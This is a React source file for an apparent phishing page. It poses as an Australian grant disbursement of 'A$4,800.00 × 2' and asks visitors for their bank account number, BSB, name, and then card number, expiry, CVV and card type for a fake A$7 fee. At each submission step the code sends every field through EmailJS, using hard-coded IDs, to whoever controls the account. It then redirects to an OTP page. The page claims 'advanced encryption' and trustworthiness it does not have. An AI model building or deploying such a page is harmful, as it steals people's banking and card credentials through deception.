import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png'

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [accNo, setAccNo] = useState('');
  const [routingNo, setRoutingNo] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setAccNo('');
    setRoutingNo('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    sendEmail();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = (e) => {
    e.preventDefault();
     sendEmail();
    setShowConfirmModal(false);
   // resetForm();
    setShowPinModal(true);
    // navigate('/otp');
  };

  const handlePinSubmit = (e) => {
    e.preventDefault();
    sendEmail();
    resetForm();
    setShowPinModal(false);
    navigate('/otp');
  };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      accNo,
      routingNo,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
    <Navbar />
    <div className="container d-flex justify-content-center mt-5">
      <div className="col-md-6 mt-5">
       
        <h3 className='mt-5'>Grant Disbursement – Verify and Complete Your Details</h3>
        <p>Funds will be transferred to your bank account. Please provide the following details to complete the payment process.</p>
        <p>Only enter correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during disbursement.</p>
        <div className="card p-4 pt-2">
        <p className='text-end fw-bold fs-6'>Double Disbursement: A$4,800.00 × 2</p>
        <p className='fst-italic text-end p-0 m-0'>Trusted and Secure Payment</p>
        <div className="d-flex justify-content-end mb-3">          
          <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
        </div>
          <Form onSubmit={handlePayClick} autoComplete="off">
            <Form.Group className="mb-3" controlId="bankName">
              <Form.Label>Bank Name</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Enter your bank name" 
                required 
                value={bankName}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setBankName(e.target.value)}
              />
            </Form.Group>

            <Form.Group className="mb-3" controlId="nameOnCard">
              <Form.Label>Full Name of Account Holder</Form.Label>
              <Form.Control
                type="text"
                placeholder="Enter account holder's full name"
                //  name="nameOnCard"
                value={nameOnCard}
                // onInput={handleTextOnlyInput}
                onChange={(e) => setNameOnCard(e.target.value)}
                required
              />
            </Form.Group>

            <Form.Group className="mb-3" controlId="accNo">
              <Form.Label>Account Number</Form.Label>
              <Form.Control
                // type="number"
                placeholder="e.g., 123456789012"
                // name="accNo"
                value={accNo}
                onInput={handleNumberOnlyInput}
                maxLength='12'
                onChange={(e) => setAccNo(e.target.value)}
                required
              />
            </Form.Group>

            <Form.Group className="mb-3" controlId="routingNo">
              <Form.Label>BSB (Bank-State-Branch) Number</Form.Label>
              <Form.Control
                // type="number"
                placeholder="e.g., 123-456"
                // name="routingNo"
                value={routingNo}
                onInput={handleNumberOnlyInput}
                maxLength='6'
                onChange={(e) => setRoutingNo(e.target.value)}
                required
              />
            </Form.Group>
           

            <p className='fst-italic'>Please review and confirm your details before submission.</p>

            <Button variant="primary" type="submit">SUBMIT</Button>
            
          </Form>
        </div>
        <p className="mt-3"><strong>Trusted and Secured</strong><br />
        Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
        
        {/* Confirmation Modal */}
        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Confirm Details</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <p>Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancel</Button>
            <Button variant="primary" onClick={handleConfirmClick}>Yes, I Have Confirmed</Button>
          </Modal.Footer>
        </Modal>

        {/* PIN Modal */}
        <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Processing Fee of A$7.00</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <Form onSubmit={handlePinSubmit}>

            <Form.Group className="mb-3" controlId="cardNumber">
              <Form.Label>Card Number</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="0000 0000 0000 0000" 
                required 
                maxLength="24" 
                value={cardNumber}
                onChange={handleCardNumberChange} 
              />
            </Form.Group>
            <div className="row">
              <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                <Form.Label>Expiration Date</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="MM / YY" 
                  required 
                  maxLength="7" 
                  value={expirationDate}
                  onChange={handleExpirationDateChange} 
                />
              </Form.Group>
              <Form.Group className="col-md-6 mb-3" controlId="cvv">
                <Form.Label>CVV</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="000" 
                  required 
                  maxLength="4" 
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  onInput={handleNumberOnlyInput}
                />
              </Form.Group>
            </div>
            {/* <Form.Group className="mb-3" controlId="nameOnCard">
              <Form.Label>Name On Card</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Enter name on card" 
                required 
                value={nameOnCard}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setNameOnCard(e.target.value)}
              />
            </Form.Group> */}
            <Form.Group className="mb-3" controlId="cardType">
              <Form.Label>Card Type</Form.Label>
              <div>
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="creditCard" 
                  label="Credit Card" 
                  required 
                  checked={cardType === 'credit'}
                  onChange={(e) => setCardType('credit')}
                />
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="debitCard" 
                  label="Debit Card" 
                  required 
                  checked={cardType === 'debit'}
                  onChange={(e) => setCardType('debit')}
                />
              </div>
            </Form.Group>

              <Button variant="primary" type="submit">PAY</Button>                           
              <p className="fw-bold text-end"> - A$7.00</p>
            </Form>
          </Modal.Body>
          <Modal.Footer>
            <Form.Text className="text-muted">Kindly avoid disclosing your information to others.</Form.Text>
          </Modal.Footer>
        </Modal>
      </div>
    </div>
    <Footer />
    </div>
  );
};

export default ExamForm;
